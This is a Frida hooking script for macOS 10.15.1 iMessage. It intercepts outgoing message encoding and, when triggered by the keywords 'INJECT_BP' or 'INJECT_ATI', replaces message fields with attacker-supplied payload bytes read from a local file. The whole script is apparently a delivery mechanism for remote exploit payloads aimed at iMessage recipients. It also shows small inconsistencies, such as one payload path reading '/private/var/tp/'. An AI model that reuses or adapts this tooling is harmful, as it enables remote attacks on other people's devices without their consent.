// Returns a string representation of an objC object.
function po(p) {
  return ObjC.Object(p).toString();
}

const iMessageBase = Module.findBaseAddress('iMessage')

// Offset fr macOS 10.15.1
const offset = 0xA21F
const deliveryReceiptHandlerAddress = iMessageBase.add(offset)
send(`Hooking - [MessageServiceSession handler:messageIDDelivered:...] @ ${deliveryReceiptHandlerAddress}`)
Interceptor.attach(deliveryReceiptHandlerAddress, {
  onEnter: function (args) {
    send('DELIVERY_RECEIPT')
  }
})

const jwEncodeDictionaryAddress = Module.getExportByName(null, 'JWEncodeDictionary')
send(`Hooking JWEncodeDictionary @ ${jwEncodeDictionaryAddress}`)
Interceptor.attach(jwEncodeDictionaryAddress, {
  onEnter: function (args) {
    const dict = ObjC.Object(args[0])
    if (!dict) {
      return
    }

    const t = dict.objectForKey_('t')
    if (!t) {
      return
    }

    if (t === 'INJECT_BP') {
      send(`Injecting BP key for message ${dict}`)
      const newDict = ObjC.classes.NSMutableDictionary.dictionaryWithDictionary_(dict)
      const d = ObjC.classes.NSData.dataWithContentsOfFile_('/private/var/tmp/com.apple.message/payload')
      newDict.setObject_forKey_('com.apple.messages.MSMessageExtensionBalloonPlugin', 'bid')
      newDict.setObject_forKey_(d, 'bp')
      newDict.setObject_forKey_('You are being hacked, please wait ...', 't')
      newDict.setObject_forKey_('<html><body>You are being hacked, please wait...</body></html>', 'x')
      args[0] = newDict.handle
    } else if (t === 'INJECT_ATI') {
      send(`Injecting ATI key for message: ${dict}`)
      const newDict = ObjC.classes.NSMutableDictionary.dictionaryWithDictionary_(dict)
      const d = ObjC.classes.NSData.dataWithContentsOfFile_('/private/var/tp/com.apple.message/payload')
      newDict.setObject_forKey_(d, 'ati')

      newDict.removeObjectForKey_('t')
      newDict.removeObjectForKey_('t')

      send('Ok')
      args[0] = newDict.handle
    }

  }
})

send('READY')
